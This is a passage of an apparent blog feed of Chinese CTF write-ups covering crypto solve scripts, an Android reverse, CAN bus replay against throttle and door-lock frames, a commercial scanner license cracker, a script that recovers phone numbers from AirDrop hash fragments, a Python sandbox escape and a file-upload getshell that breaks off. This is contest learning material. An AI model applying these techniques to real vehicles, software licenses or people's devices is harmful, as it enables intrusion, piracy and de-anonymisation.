class="hljs-string">&#x27;597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c&#x27;</span>,<br>     <span class="hljs-string">&#x27;bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374&#x27;</span>,<br>     <span class="hljs-string">&#x27;cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187&#x27;</span>,<br>     <span class="hljs-string">&#x27;1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97&#x27;</span>,<br>     <span class="hljs-string">&#x27;820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f&#x27;</span>,<br>     <span class="hljs-string">&#x27;e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc&#x27;</span>,<br>     <span class="hljs-string">&#x27;f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675&#x27;</span>,<br>     <span class="hljs-string">&#x27;a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75&#x27;</span>,<br>     <span class="hljs-string">&#x27;07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6&#x27;</span>,<br>     <span class="hljs-string">&#x27;6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded&#x27;</span>,<br>     <span class="hljs-string">&#x27;a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489&#x27;</span>,<br>     <span class="hljs-string">&#x27;c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986&#x27;</span>,<br>     <span class="hljs-string">&#x27;6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6&#x27;</span>,<br>     <span class="hljs-string">&#x27;c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe&#x27;</span>,<br>     <span class="hljs-string">&#x27;040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2&#x27;</span>,<br>     <span class="hljs-string">&#x27;4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b&#x27;</span>]<br><br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)):<br>        t1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">id</span>[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data.append(t1 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t1 &gt;&gt;= <span class="hljs-number">32</span><br>        t2 = <span class="hljs-built_in">int</span>(code[i], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            data.append(t2 &amp; <span class="hljs-number">0xffffffff</span>)<br>            t2 &gt;&gt;= <span class="hljs-number">32</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(data))<br>state1=recover_state(data)<br>state0=backtrace([<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>+state1)[:<span class="hljs-number">624</span>]<br>ran=Random()<br>ran.setstate((<span class="hljs-number">3</span>,<span class="hljs-built_in">tuple</span>(state0+[<span class="hljs-number">0</span>]),<span class="hljs-literal">None</span>))<br>id0=ran.getrandbits(<span class="hljs-number">128</span>)<br>code0=ran.getrandbits(<span class="hljs-number">256</span>)<br><span class="hljs-keyword">assert</span> ran.getrandbits(<span class="hljs-number">32</span>)==data[<span class="hljs-number">0</span>]<br>flag=md5((<span class="hljs-built_in">hex</span>(id0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)+<span class="hljs-built_in">hex</span>(code0)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">64</span>)).encode()).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;%s&#125;&quot;</span>%flag)<br><br><span class="hljs-comment">#flag&#123;22b307a4ac14c89888d5a6c79f7f963c&#125;</span><br></code></pre></td></tr></table></figure><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>jadx打开在MainActivity中发现判断逻辑<br><img src="/mdimg/2023hwswinter/1.png"><br>查看check函数<br><img src="/mdimg/2023hwswinter/2.png"><br>因为看到了check函数，根据逻辑去解发现解不出来<br><img src="/mdimg/2023hwswinter/3.png"><br>看到了c这个类中对enc这个文件进行了异或。将apk解压发现assets文件夹下有enc这个文件。按逻辑复原数据。<br><img src="/mdimg/2023hwswinter/4.png"><br>发现这是一个dex文件，接着用jadx打开<br><img src="/mdimg/2023hwswinter/5.png"><br>发现aes加密，网站直接解<br><img src="/mdimg/2023hwswinter/6.png"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="sound-from-somewhere"><a href="#sound-from-somewhere" class="headerlink" title="sound from somewhere"></a>sound from somewhere</h2><p>一眼顶针为SSTV  使用MSSTV转换<br><img src="/mdimg/2023hwswinter/7.bmp"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWNHUB 2022 冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开附件在<code>APMServ5.2.6&gt;www&gt;htdocs&gt;server&gt;game&gt;BattleNetGateway.php</code><br>可以看到存在漏洞，可以上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 